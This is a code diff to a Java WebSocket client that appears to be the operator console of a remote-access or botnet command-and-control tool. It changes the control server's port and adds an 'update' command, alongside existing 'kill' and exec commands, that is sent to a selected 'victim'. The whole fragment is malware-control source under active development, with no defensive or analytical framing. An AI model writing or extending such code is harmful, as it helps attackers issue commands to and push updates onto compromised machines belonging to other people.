@@ -106,7 +106,7 @@ public class Client extends WebSocketClient {
 
     public static void main(String[] args) {
         try {
-            URI serverUri = new URI("ws://192.168.1.101:8080/ws");
+            URI serverUri = new URI("ws://192.168.1.101:20888/ws");
             Client client = new Client(serverUri);
             client.connect();
 
@@ -152,6 +152,9 @@ public class Client extends WebSocketClient {
                         System.out.println("No victims selected to execute commands");
                     }else if(splitMsg[1].equals("kill")){
                         client.send(commands.exec(myID,getSelectedVictim(), splitMsg[1]+" "+splitMsg[2]));
+
+                    }else if(splitMsg[1].equals("update")){
+                        client.send(commands.exec(myID,getSelectedVictim(), splitMsg[1]+" "+splitMsg[2]+" "+splitMsg[3]));
 
                     }else{
                         client.send(commands.exec(myID,getSelectedVictim(), splitMsg[1]));
